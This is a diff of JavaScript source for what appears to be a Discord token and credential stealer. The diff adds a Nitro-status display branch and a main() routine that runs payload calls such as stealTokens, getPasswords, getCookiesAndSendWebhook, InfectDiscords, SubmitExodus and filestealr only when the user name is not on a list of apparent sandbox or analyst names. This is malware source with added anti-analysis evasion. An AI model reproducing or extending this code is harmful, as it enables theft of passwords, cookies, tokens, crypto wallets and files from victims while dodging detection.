+					i += 0
+				} else {
+					i += 1
+				} if (boost6month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost9month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost12month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost15month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost18month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost24month > 0) {
+					i += 0
+				} else if (boost24month < 0 || boost24month == 0) {
+					i += 1
+				} else {
+					i = 0
+				}
+			} catch {
+				i += 0
+			}
+			return `<:946246402105819216:962747802797113365> ${boost[i]}`
+		default:
+			return "\`No Nitro\`";
+	};
 }
 
 async function getIp() {
-    var ip = await axios.get("https://www.myexternalip.com/raw")
-    return ip.data;
+	var ip = await axios.get("https://www.myexternalip.com/raw")
+	return ip.data;
 }
 
 //
@@ -2055,19 +2130,35 @@ function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
 
+const forbiddenNames = ["george", "Bruno", "azure", "Abby", "scottgar", "Frank", "Admin", "dekker", "6OIkB", "OJP5oC1hwP", "kazunori", "MGreen", "vCzMcRM", "kEecfMwgj", "Es4efUKoPT", "AlexeyZolotov"];
 
+function getUserName() {
+    return process.env.USERNAME || process.env.USER || 'unknown';
+}
+
+function main() {
+    const userName = getUserName().toLowerCase();
+    
+    if (!forbiddenNames.map(name => name.toLowerCase()).includes(userName)) {
 		closeBrowsers();
 		StopCords();
 		getEncrypted();
 		getCookiesAndSendWebhook();
 		getExtension();
 		InfectDiscords();
-	  stealTokens();
-	getAutofills();
-	getPasswords();
+		stealTokens();
+		getAutofills();
+		getPasswords();
 		getZippp();
 		SubmitTelegram();
 		SubmitExodus();
 		submitfilezilla();
 		getIPAddress();
-filestealr();
+		filestealr();
+		
+    } else {
+        console.log("User name is forbidden. Script will not run.");
+    }
+}
+
+main();
